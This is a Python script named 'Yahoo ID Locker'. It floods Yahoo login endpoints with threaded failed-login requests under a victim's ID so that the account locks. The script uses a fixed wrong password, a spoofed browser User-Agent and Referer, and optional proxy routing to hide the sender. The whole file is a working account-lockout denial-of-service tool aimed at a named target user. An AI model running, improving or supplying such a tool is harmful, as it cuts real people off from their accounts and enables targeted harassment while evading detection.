#! /usr/bin/env python3.1
# 08.03.2010 <> 09.03.2010 | cmiN
# Yahoo ID Locker (console)

import sys, time, urllib.request, threading

def main(args):
    usage = """\t\t Yahoo ID Locker 1.0
\t Usage: yidl.py ymsgrid timeout delay attacks method verbose proxy [address:port]
Where ymsgrid is the victim Yahoo ID
      timeout is a float (seconds)
      delay is a float (seconds)
      attacks is an integer (how many requests)
      method is the page to use
          a - pwtoken_get
          b - isp_verify_user
      verbose is an integer
          1 - print the retrieved data
          0 - print nothing
      proxy is an integer
          1 - enable proxy support
                  address is the host ip
                  port is the port address
          0 - use global settings
\t Example: yidl.py cmin764 10 0.1 20 a 1 1 186.56.68.5:8080"""
    if len(args) in range(8, 10):
        try:
            print("Please wait...")
            if int(args[7]) == 1:
                host = args[8]
            else:
                host = None
            attack(args[1], float(args[2]), float(args[3]), int(args[4]), args[5], int(args[6]), host)
        except Exception as message:
            print("An error occurred: {}".format(message))
        except:
            print("Unknown error.")
        else:
            print("Ready!")
    else:
        print(usage)
        input()

def attack(ymsgrid, timeout, delay, attacks, method, verbose, host):
    if method == "a" or method == "A":
        link = "https://login.yahoo.com/config/pwtoken_get?src=ymsgr&login={usr}&passwd={pwd}"
    elif method == "b" or method == "B":
        link = "https://login.yahoo.com/config/isp_verify_user?cookies=1&p={pwd}&l={usr}"
    else:
        raise Exception("Invalid method")
    link = link.format(usr=ymsgrid, pwd="pass1337")
    headers = {
        "Referer": "https://login.yahoo.com",
        "User-Agent": "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.6) Gecko/2009020911 Ubuntu/8.04 (hardy) Firefox/3.0.6"}
    YDL.link = link
    YDL.headers = headers
    YDL.timeout = timeout
    YDL.verbose = verbose
    YDL.host = host
    while attacks > 0:
        YDL().start()
        time.sleep(delay)
        attacks -= 1
    while threading.active_count() > 1:
        pass

class YDL(threading.Thread):

    link = None
    headers = None
    timeout = None
    verbose = None
    host = None
    
    def __init__(self):
        threading.Thread.__init__(self)
        
    def run(self):
        request = urllib.request.Request(self.link, headers=self.headers)
        if self.host:
            request.set_proxy(self.host, "https")
        try:
            with urllib.request.urlopen(request, timeout=self.timeout) as uin:
                if self.verbose:
                    print(uin.read())
        except:
            pass

if __name__ == "__main__":
    main(sys.argv)
